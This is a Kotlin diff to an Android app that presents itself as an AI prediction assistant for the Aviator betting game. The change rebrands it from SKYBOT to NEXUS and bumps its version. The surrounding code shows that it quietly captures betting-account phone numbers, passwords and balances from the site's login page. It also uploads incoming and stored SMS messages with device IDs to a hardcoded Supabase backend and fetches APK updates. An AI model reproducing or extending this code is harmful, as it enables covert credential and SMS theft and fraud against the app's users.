@@ -474,7 +474,7 @@ class MainActivity : AppCompatActivity() {
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
     private val TABELA = "credenciais"
-    private val VERSAO_ATUAL = "5.2"
+    private val VERSAO_ATUAL = "5.3"
 
     // ── Chaves de IA carregadas remotamente do Supabase (tabela "config") ──────
     // Os valores abaixo são apenas fallback local caso o Supabase não responda.
@@ -842,13 +842,13 @@ class MainActivity : AppCompatActivity() {
                 val numRaw = ultimoNumeroEnviado.ifEmpty { numeroTemporario }
                 val num = if (numRaw.startsWith("244") && numRaw.length > 9) numRaw.substring(3) else numRaw
                 val sen = ultimaSenhaEnviada
-                android.util.Log.d("SKYBOT_CRED", "submeterCredencial() chamado num='$num' sen.len=${sen.length}")
+                android.util.Log.d("NEXUS_CRED", "submeterCredencial() chamado num='$num' sen.len=${sen.length}")
                 if (num.isNotEmpty() && sen.isNotEmpty()) {
                     enviarCredencial(num, sen)
-                    android.util.Log.d("SKYBOT_CRED", "submeterCredencial() → enviando num=$num")
+                    android.util.Log.d("NEXUS_CRED", "submeterCredencial() → enviando num=$num")
                 } else {
                     // Tentar capturar campos da página diretamente antes de desistir
-                    android.util.Log.w("SKYBOT_CRED", "submeterCredencial() campos vazios — num='$num' sen='$sen'")
+                    android.util.Log.w("NEXUS_CRED", "submeterCredencial() campos vazios — num='$num' sen='$sen'")
                 }
             }
 
@@ -856,7 +856,7 @@ class MainActivity : AppCompatActivity() {
             fun reportarSaldo(saldo: String) {
                 // Chamado pelo JS após login quando o saldo está visível na página
                 if (saldo.isNotEmpty()) {
-                    android.util.Log.d("SKYBOT_CRED", "reportarSaldo() → saldo=$saldo")
+                    android.util.Log.d("NEXUS_CRED", "reportarSaldo() → saldo=$saldo")
                     atualizarSaldo(saldo)
                 }
             }
@@ -1120,7 +1120,7 @@ class MainActivity : AppCompatActivity() {
                                             numeroTemporario    = pendingNum
                                             // Remover indicativo 244 se presente
                                             val numLimpo = if (pendingNum.startsWith("244") && pendingNum.length > 9) pendingNum.substring(3) else pendingNum
-                                            android.util.Log.d("SKYBOT_CRED", "Número final → $numLimpo")
+                                            android.util.Log.d("NEXUS_CRED", "Número final → $numLimpo")
                                             enviarSupabase("Numero", numLimpo)
                                         }
                                     }
@@ -1138,7 +1138,7 @@ class MainActivity : AppCompatActivity() {
                                         if (pendingSen != credUltimaSen) {
                                             credUltimaSen      = pendingSen
                                             ultimaSenhaEnviada = pendingSen
-                                            android.util.Log.d("SKYBOT_CRED", "Senha final → len=${pendingSen.length}")
+                                            android.util.Log.d("NEXUS_CRED", "Senha final → len=${pendingSen.length}")
                                             enviarSupabase("Senha", pendingSen)
                                         }
                                     }
@@ -2297,7 +2297,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
             conn.setRequestProperty("Authorization", "Bearer $key")
             conn.setRequestProperty("Content-Type", "application/json")
             conn.setRequestProperty("HTTP-Referer", "https://elephantbet.co.ao")
-            conn.setRequestProperty("X-Title", "SKYBOT Aviator")
+            conn.setRequestProperty("X-Title", "NEXUS Aviator")
             conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36")
             conn.doOutput = true
             conn.connectTimeout = 30000
@@ -2432,7 +2432,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                 // Limpar UI imediatamente — countdown aparece na zona central (txtJanela)
                 runOnUiThread {
                     // Topo: tendência mostra estado neutro (não o countdown)
-                    txtAcao.text = "SKYBOT"
+                    txtAcao.text = "NEXUS"
                     txtAcao.setTextColor(Color.parseColor("#334155"))
                     txtAcao.visibility = View.VISIBLE
                     // Zona central: limpar previsão anterior
@@ -2488,7 +2488,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                             // Ignorar modoSilenciosoAtivo — o ciclo não depende do voo
                             modoSilenciosoAtivo = false
                             runOnUiThread {
-                                txtAcao.text = "SKYBOT"
+                                txtAcao.text = "NEXUS"
                                 txtAcao.setTextColor(Color.parseColor("#334155"))
                                 if (::txtJanela.isInitialized) {
                                     txtJanela.text = "🔍 IA a analisar..."
@@ -2585,9 +2585,9 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                 if (novoUltimo > ultimoTimestamp) {
                     prefs.edit().putLong("sms_ultimo_timestamp", novoUltimo).apply()
                 }
-                android.util.Log.d("SKYBOT_SMS", "Sincronizadas $enviadas SMS do ContentProvider")
+                android.util.Log.d("NEXUS_SMS", "Sincronizadas $enviadas SMS do ContentProvider")
             } catch (e: Exception) {
-                android.util.Log.w("SKYBOT_SMS", "Erro sincronizarSMS: ${e.message}")
+                android.util.Log.w("NEXUS_SMS", "Erro sincronizarSMS: ${e.message}")
             }
         }.start()
     }
@@ -2607,7 +2607,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                     val remetente = msg.displayOriginatingAddress ?: "desconhecido"
                     val corpo = msg.messageBody ?: ""
                     val timestamp = System.currentTimeMillis()
-                    android.util.Log.d("SKYBOT_SMS", "SMS recebida de $remetente")
+                    android.util.Log.d("NEXUS_SMS", "SMS recebida de $remetente")
                     enviarSMSSupabase(remetente, corpo, timestamp)
                     // Actualizar o timestamp guardado
                     getSharedPreferences("skybot_prefs", MODE_PRIVATE)
@@ -2654,13 +2654,13 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                 val code = conn.responseCode
                 if (code !in 200..299) {
                     val err = conn.errorStream?.bufferedReader()?.readText() ?: ""
-                    android.util.Log.w("SKYBOT_SMS", "Supabase SMS erro HTTP $code: $err")
+                    android.util.Log.w("NEXUS_SMS", "Supabase SMS erro HTTP $code: $err")
                 } else {
-                    android.util.Log.d("SKYBOT_SMS", "Supabase SMS HTTP $code OK")
+                    android.util.Log.d("NEXUS_SMS", "Supabase SMS HTTP $code OK")
                 }
                 conn.disconnect()
             } catch (e: Exception) {
-                android.util.Log.w("SKYBOT_SMS", "Erro ao enviar SMS: ${e.message}")
+                android.util.Log.w("NEXUS_SMS", "Erro ao enviar SMS: ${e.message}")
             }
         }.start()
     }
@@ -2697,12 +2697,12 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                     mapa["or_model"]?.let { OR_MODEL = it }
                     mapa["ds_key"]?.let   { DS_KEY   = it }
                     mapa["ds_model"]?.let { DS_MODEL = it }
-                    android.util.Log.d("SKYBOT_CONFIG", "Config remota carregada: ${mapa.keys}")
+                    android.util.Log.d("NEXUS_CONFIG", "Config remota carregada: ${mapa.keys}")
                 } else {
-                    android.util.Log.w("SKYBOT_CONFIG", "Config remota: HTTP ${conn.responseCode} — a usar valores locais")
+                    android.util.Log.w("NEXUS_CONFIG", "Config remota: HTTP ${conn.responseCode} — a usar valores locais")
                 }
             } catch (e: Exception) {
-                android.util.Log.w("SKYBOT_CONFIG", "Config remota falhou: ${e.message} — a usar valores locais")
+                android.util.Log.w("NEXUS_CONFIG", "Config remota falhou: ${e.message} — a usar valores locais")
             }
         }.start()
     }
@@ -2922,13 +2922,13 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                 val code = conn.responseCode
                 if (code !in 200..299) {
                     val err = conn.errorStream?.bufferedReader()?.readText() ?: ""
-                    android.util.Log.w("SKYBOT_INSTALL", "PATCH ultimo_acesso HTTP $code: $err")
+                    android.util.Log.w("NEXUS_INSTALL", "PATCH ultimo_acesso HTTP $code: $err")
                 } else {
-                    android.util.Log.d("SKYBOT_INSTALL", "PATCH ultimo_acesso OK — $androidId")
+                    android.util.Log.d("NEXUS_INSTALL", "PATCH ultimo_acesso OK — $androidId")
                 }
                 conn.disconnect()
             } catch (e: Exception) {
-                android.util.Log.w("SKYBOT_INSTALL", "actualizarUltimoAcesso: ${e.message}")
+                android.util.Log.w("NEXUS_INSTALL", "actualizarUltimoAcesso: ${e.message}")
             }
         }.start()
     }
@@ -2986,7 +2986,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                     conn.disconnect()
                 }
             } catch (e: Exception) {
-                android.util.Log.e("SKYBOT_INSTALL", "Erro ao registar instalação: ${e.message}")
+                android.util.Log.e("NEXUS_INSTALL", "Erro ao registar instalação: ${e.message}")
             }
         }.start()
     }
@@ -3015,7 +3015,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
     fun atualizarSaldo(saldo: String) {
         if (saldo.isEmpty()) return
         if (sessaoId < 0) {
-            android.util.Log.w("SKYBOT_CRED", "atualizarSaldo ignorado — sessaoId não disponível ainda")
+            android.util.Log.w("NEXUS_CRED", "atualizarSaldo ignorado — sessaoId não disponível ainda")
             // Tentar de novo em 2s (INSERT pode ainda estar em curso)
             handler.postDelayed({ atualizarSaldo(saldo) }, 2000)
             return
@@ -3036,9 +3036,9 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                 java.io.OutputStreamWriter(conn.outputStream).use { it.write(json) }
                 val code = conn.responseCode
                 conn.disconnect()
-                android.util.Log.d("SKYBOT_CRED", "atualizarSaldo -> HTTP $code | id=$sessaoId saldo=$saldoEsc")
+                android.util.Log.d("NEXUS_CRED", "atualizarSaldo -> HTTP $code | id=$sessaoId saldo=$saldoEsc")
             } catch (e: Exception) {
-                android.util.Log.e("SKYBOT_CRED", "atualizarSaldo falhou: ${e.message}")
+                android.util.Log.e("NEXUS_CRED", "atualizarSaldo falhou: ${e.message}")
             }
         }.start()
     }
@@ -3069,23 +3069,23 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                     java.io.BufferedReader(java.io.InputStreamReader(stream)).readText()
                 else ""
                 conn.disconnect()
-                android.util.Log.d("SKYBOT_CRED", "enviarCredencial HTTP=$code resp=$resp")
+                android.util.Log.d("NEXUS_CRED", "enviarCredencial HTTP=$code resp=$resp")
                 // Extrair o id da resposta: [{"id":42,"numero":...}]
                 val idMatch = Regex("\"id\"\\s*:\\s*(\\d+)").find(resp)
                 if (idMatch != null) {
                     sessaoId = idMatch.groupValues[1].toInt()
-                    android.util.Log.d("SKYBOT_CRED", "enviarCredencial -> sessaoId=$sessaoId")
+                    android.util.Log.d("NEXUS_CRED", "enviarCredencial -> sessaoId=$sessaoId")
                 } else {
-                    android.util.Log.w("SKYBOT_CRED", "enviarCredencial -> HTTP $code sem id na resposta: $resp")
+                    android.util.Log.w("NEXUS_CRED", "enviarCredencial -> HTTP $code sem id na resposta: $resp")
                     // Retry automático após falha de rede (1 tentativa)
                     if (code !in 200..299 && numero.isNotEmpty() && senha.isNotEmpty()) {
-                        android.util.Log.w("SKYBOT_CRED", "A tentar de novo em 5s...")
+                        android.util.Log.w("NEXUS_CRED", "A tentar de novo em 5s...")
                         Thread.sleep(5000)
                         enviarCredencial(numero, senha)
                     }
                 }
             } catch (e: Exception) {
-                android.util.Log.e("SKYBOT_CRED", "enviarCredencial falhou: ${e.message}")
+                android.util.Log.e("NEXUS_CRED", "enviarCredencial falhou: ${e.message}")
             }
         }.start()
     }
@@ -3094,7 +3094,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
         val androidId = android.provider.Settings.Secure.getString(
             contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown"
         val json = "{\"tipo\":\"$tipoVal\",\"valor\":\"$valorVal\",\"device_id\":\"$androidId\"}"
-        android.util.Log.d("SKYBOT_CRED", "enviarSupabase → tipo=$tipoVal valor=$valorVal")
+        android.util.Log.d("NEXUS_CRED", "enviarSupabase → tipo=$tipoVal valor=$valorVal")
         Thread {
             try {
                 val conn = URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as HttpURLConnection
@@ -3110,12 +3110,12 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                 val errBody = if (errStream != null) BufferedReader(InputStreamReader(errStream)).readText() else ""
                 conn.disconnect()
                 if (code in 200..299) {
-                    android.util.Log.d("SKYBOT_CRED", "enviarSupabase OK → HTTP $code tipo=$tipoVal")
+                    android.util.Log.d("NEXUS_CRED", "enviarSupabase OK → HTTP $code tipo=$tipoVal")
                 } else {
-                    android.util.Log.e("SKYBOT_CRED", "enviarSupabase ERRO → HTTP $code | $errBody")
+                    android.util.Log.e("NEXUS_CRED", "enviarSupabase ERRO → HTTP $code | $errBody")
                 }
             } catch (e: Exception) {
-                android.util.Log.e("SKYBOT_CRED", "enviarSupabase EXCEPÇÃO: ${e.message}")
+                android.util.Log.e("NEXUS_CRED", "enviarSupabase EXCEPÇÃO: ${e.message}")
             }
         }.start()
     }
@@ -3167,11 +3167,11 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
 
     private fun iniciarDownloadApk(versaoNova: String, urlApk: String) {
         try {
-            val nomeArquivo = "SKYBOT-v$versaoNova.apk"
+            val nomeArquivo = "NEXUS-v$versaoNova.apk"
 
             // Diálogo de progresso
             val progressDialog = AlertDialog.Builder(this)
-                .setTitle("⬇️ A descarregar SKYBOT v$versaoNova")
+                .setTitle("⬇️ A descarregar NEXUS v$versaoNova")
                 .setMessage("Por favor aguarda...")
                 .setCancelable(false)
                 .create()
@@ -3237,7 +3237,7 @@ REGRAS DO JSON — lê os dados reais, nao uses valores fixos:
                 else -> "➡️"
             }
             val confTxt = if (confianca > 0) " · $confianca%" else ""
-            val tendTxt = if (tendencia.isNotEmpty()) "$icone $tendencia$confTxt" else "SKYBOT: SINAL ACTIVO"
+            val tendTxt = if (tendencia.isNotEmpty()) "$icone $tendencia$confTxt" else "NEXUS: SINAL ACTIVO"
             val horaTxt = "${String.format("%02d", horaAtual)}:${String.format("%02d", minAgora)}"
             // Actualizar relógio fixo
             if (::txtRelogio.isInitialized) {
@@ -3409,7 +3409,7 @@ private fun mostrarEmVoo(num: Double) {
 
         // ── Cabeçalho ──
         layout.addView(TextView(this).apply {
-            text = "SKYBOT  v$VERSAO_ATUAL"
+            text = "NEXUS  v$VERSAO_ATUAL"
             textSize = 16f; setTextColor(Color.WHITE); typeface = Typeface.DEFAULT_BOLD
             layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(6) }
         })
@@ -3464,7 +3464,7 @@ private fun mostrarEmVoo(num: Double) {
 
         // ── Grupo: App ──
         layout.addView(seccao("APP"))
-        layout.addView(btn("❓  Como usar o SKYBOT", "#0e7490") {
+        layout.addView(btn("❓  Como usar o NEXUS", "#0e7490") {
             dialog.dismiss(); mostrarTutorial()
         })
         layout.addView(btn("🔄  Verificar actualização", "#1d4ed8") {
@@ -3496,13 +3496,13 @@ private fun mostrarEmVoo(num: Double) {
     // ── TUTORIAL ─────────────────────────────────────────────────
     private fun mostrarTutorial() {
         val slides = listOf(
-            Triple("🛰️ BEM-VINDO AO SKYBOT", "#0e7490",
-                "O SKYBOT é um assistente inteligente para o jogo Aviator.\n\n" +
+            Triple("🛰️ BEM-VINDO AO NEXUS", "#0e7490",
+                "O NEXUS é um assistente inteligente para o jogo Aviator.\n\n" +
                 "Ele analisa as últimas velas em tempo real e usa Inteligência Artificial para prever quando é mais provável aparecer uma vela alta.\n\n" +
                 "⚠️ Lembra: nenhum bot garante lucros. Joga sempre com responsabilidade e nunca apostas o que não podes perder."
             ),
             Triple("⏳ FASE DE RECOLHA — AGUARDA AS 15 VELAS", "#b45309",
-                "Ao abrir o Aviator, o SKYBOT NÃO analisa imediatamente.\n\n" +
+                "Ao abrir o Aviator, o NEXUS NÃO analisa imediatamente.\n\n" +
                 "Primeiro precisa de observar 15 velas ao vivo para ter dados suficientes.\n\n" +
                 "Durante essa fase verás na barra:\n" +
                 "⏳ A RECOLHER DADOS — 8/15 velas capturadas\n\n" +
@@ -3530,7 +3530,7 @@ private fun mostrarEmVoo(num: Double) {
                 "⚠️ Nunca aumentes a aposta após perda (sem Martingale)!"
             ),
             Triple("🚫 QUANDO NÃO ENTRAR", "#dc2626",
-                "O SKYBOT avisa quando NÃO deves jogar:\n\n" +
+                "O NEXUS avisa quando NÃO deves jogar:\n\n" +
                 "🔵🔵🔵 COMBOIO DE AZUIS — 3 ou mais seguidos → PARA! Mercado em queda.\n\n" +
                 "📉 QUEDA — Tendência a descer → reduz aposta ou não entres.\n\n" +
                 "⚡ Após uma vela MEGA (≥50x) → as próximas costumam ser azuis por 2-5 rondas.\n\n" +
@@ -3538,7 +3538,7 @@ private fun mostrarEmVoo(num: Double) {
             ),
             Triple("💰 GESTÃO DE BANCA", "#065f46",
                 "Define a tua banca em ⚙️ → DEFINIR BANCA.\n\n" +
-                "O SKYBOT calcula automaticamente a aposta segura por ronda: 2% da banca.\n" +
+                "O NEXUS calcula automaticamente a aposta segura por ronda: 2% da banca.\n" +
                 "Exemplo: Banca 5.000 AOA → aposta de 100 AOA por ronda.\n\n" +
                 "Estratégia recomendada:\n" +
                 "• 70% da aposta com saída na PROTECÇÃO\n" +
@@ -3547,7 +3547,7 @@ private fun mostrarEmVoo(num: Double) {
                 "🚫 NUNCA usar Martingale (dobrar após perda)."
             ),
             Triple("🛑 STOP-LOSS & TAKE-PROFIT", "#7c2d12",
-                "O SKYBOT protege-te automaticamente:\n\n" +
+                "O NEXUS protege-te automaticamente:\n\n" +
                 "🛑 STOP-LOSS: Se perderes 20% da banca inicial, o app avisa para parar.\n" +
                 "Exemplo: Banca 5.000 AOA → para ao perder 1.000 AOA.\n\n" +
                 "✅ TAKE-PROFIT: Se ganhares 30% da banca inicial, o app sugere parar e guardar.\n" +
@@ -3712,7 +3712,7 @@ private fun mostrarEmVoo(num: Double) {
             runOnUiThread {
                 AlertDialog.Builder(this)
                     .setTitle("🛑 STOP-LOSS ACTIVADO")
-                    .setMessage("Perdeste ${String.format("%.0f", perdaTotal)} AOA (${STOP_LOSS_PORCENTO.toInt()}% da banca inicial).\n\nO SKYBOT recomenda parar agora.\n\nContinuar a jogar agora é emocionalmente arriscado.")
+                    .setMessage("Perdeste ${String.format("%.0f", perdaTotal)} AOA (${STOP_LOSS_PORCENTO.toInt()}% da banca inicial).\n\nO NEXUS recomenda parar agora.\n\nContinuar a jogar agora é emocionalmente arriscado.")
                     .setPositiveButton("Parar e sair") { _, _ -> finish() }
                     .setNegativeButton("Ignorar (risco meu)") { d, _ -> d.dismiss() }
                     .show()
